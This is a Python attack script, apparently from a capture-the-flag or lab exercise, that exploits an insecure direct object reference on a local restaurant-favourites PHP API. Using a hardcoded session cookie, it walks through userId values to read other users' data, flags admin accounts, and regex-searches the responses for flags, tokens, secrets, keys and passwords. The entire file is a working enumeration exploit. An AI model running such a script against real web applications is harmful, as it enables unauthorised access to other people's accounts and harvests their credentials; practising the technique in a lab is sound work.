import requests
import json
import re

# Configuration
base_url = "http://127.0.0.1:32825"
endpoint = "/api/get_favorite_restaurants.php"
session_cookie = {'PHPSESSID': 'hk4mi61pda6ge5d66s5qjhkil3'}

print("[*] Extended IDOR Enumeration with FLAG Search")
print(f"[*] Target: {base_url}{endpoint}\n")

# Extended enumeration range
extended_range = range(51, 101)
admin_accounts = []
flag_found = False
flag_value = None
interesting_users = []

# First check IDs 1-11 for flags
print("[*] Searching for flags in user IDs 1-11...")
for user_id in range(1, 12):
    url = f"{base_url}{endpoint}?userId={user_id}"
    
    try:
        response = requests.get(url, cookies=session_cookie, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            success = data.get('success', False)
            
            if success:
                user_data = data.get('data', {})
                username = user_data.get('username', 'Unknown')
                data_str = json.dumps(data)
                
                # Search for FLAG pattern
                flag_match = re.search(r'FLAG\{[^}]+\}', data_str)
                if flag_match:
                    flag_found = True
                    flag_value = flag_match.group(0)
                    print(f"[!] FLAG FOUND in userId {user_id}!")
                    print(f"Flag: {flag_value}")
                    print(f"Username: {username}")
                    print(f"Full response: {data_str}")
                
                # Check if username contains admin or flag or interesting patterns
                if 'flag' in username.lower() or 'token' in username.lower() or 'secret' in username.lower():
                    interesting_users.append({'userId': user_id, 'username': username, 'type': 'interesting_name'})
                elif 'admin' in username.lower():
                    admin_accounts.append({'userId': user_id, 'username': username})
                    interesting_users.append({'userId': user_id, 'username': username, 'type': 'admin'})
                    
    except Exception as e:
        print(f"[!] Error checking userId {user_id}: {e}")

# Now search extended range for more users
print(f"\n[*] Searching extended range {min(extended_range)}-{max(extended_range)}...")
additional_users = 0

for user_id in extended_range:
    url = f"{base_url}{endpoint}?userId={user_id}"
    
    try:
        response = requests.get(url, cookies=session_cookie, timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            success = data.get('success', False)
            
            if success:
                user_data = data.get('data', {})
                username = user_data.get('username', 'Unknown')
                restaurants = user_data.get('restaurants', [])
                
                additional_users += 1
                admin_marker = " [ADMIN]" if 'admin' in username.lower() else ""
                print(f"[+] userId {user_id}: {username}{admin_marker} - {len(restaurants)} restaurants")
                
                # Search for flags
                data_str = json.dumps(data)
                flag_matches = re.findall(r'FLAG\{[^}]+\}', data_str, re.I)
                if flag_matches:
                    flag_found = True
                    flag_value = flag_matches
                    print(f"[!] FLAGS FOUND in userId {user_id}: {flag_matches}")
                
                # Check for interesting patterns
                data_lower = data_str.lower()
                if 'flag' in data_lower or 'token' in data_lower or 'secret' in data_lower or 'key' in data_lower:
                    interesting_users.append({'userId': user_id, 'username': username, 'type': 'interesting_content'})
                
                if 'admin' in username.lower():
                    admin_accounts.append({'userId': user_id, 'username': username})
                    
    except Exception as e:
        pass  # Skip errors in extended range

# Summary
print("\n" + "="*60)
print("FINAL EXTENDED ENUMERATION RESULTS")
print("="*60)

print(f"\n[*] Known admin accounts:")
for admin in admin_accounts:
    print(f"  - userId {admin['userId']}: {admin['username']}")

print(f"\n[*] Found a total of {11 + additional_users} valid users")
if additional_users > 0:
    print(f"  - First batch (1-11): 11 users")
    print(f"  - Extended range (51-{max(extended_range)}): {additional_users} users")

if flag_found:
    print(f"\n[!] FLAG DISCOVERED: {flag_value if isinstance(flag_value, str) else ', '.join(flag_value)}")
else:
    print(f"\n[-] No flags found in any user profiles")

if interesting_users:
    print(f"\n[*] Interesting users found:")
    for user in interesting_users:
        print(f"  - userId {user['userId']}: {user['username']} [{user['type']}]")

# Search for additional indicators in all responses
print(f"\n[*] Checking ALL users for hidden flags or tokens...")
all_flag_patterns = []

for user_id in range(1, max(extended_range)+1):
    try:
        url = f"{base_url}{endpoint}?userId={user_id}"
        response = requests.get(url, cookies=session_cookie, timeout=3)
        
        if response.status_code == 200:
            data = response.json()
            success = data.get('success', False)
            
            if success:
                data_str = json.dumps(data)
                
                # Look for various patterns
                patterns = {
                    'flag': re.findall(r'FLAG[\{\[].*?[\}\]]', data_str, re.I),
                    'token': re.findall(r'token["\']?\s*:\s*["\']([^"\']+)["\']', data_str, re.I),
                    'secret': re.findall(r'secret["\']?\s*:\s*["\']([^"\']+)["\']', data_str, re.I),
                    'key': re.findall(r'key["\']?\s*:\s*["\']([^"\']+)["\']', data_str, re.I),
                    'password': re.findall(r'password["\']?\s*:\s*["\']([^"\']+)["\']', data_str, re.I),
                }
                
                for pattern_type, matches in patterns.items():
                    if matches:
                        all_flag_patterns.extend([f"u{user_id}_{pattern_type}_{m}" for m in matches])
                        
    except:
        pass

if all_flag_patterns:
    print(f"\n[!] ADDITIONAL PATTERNS FOUND:")
    for pattern in all_flag_patterns[:10]:  # Show first 10
        print(f"  {pattern}")
    if len(all_flag_patterns) > 10:
        print(f"  ... and {len(all_flag_patterns) - 10} more")

if flag_found and flag_value:
    print(f"\n{'='*60}")
    print("FINAL RESULT: FLAG FOUND!")
    print("="*60)
    print(f"FLAG: {flag_value if isinstance(flag_value, str) else ', '.join(flag_value)}")
else:
    print(f"\nPrimary account exploited: userId=7 (admin)")
    print(f"No flag found in enumeration - check other endpoints for flag")

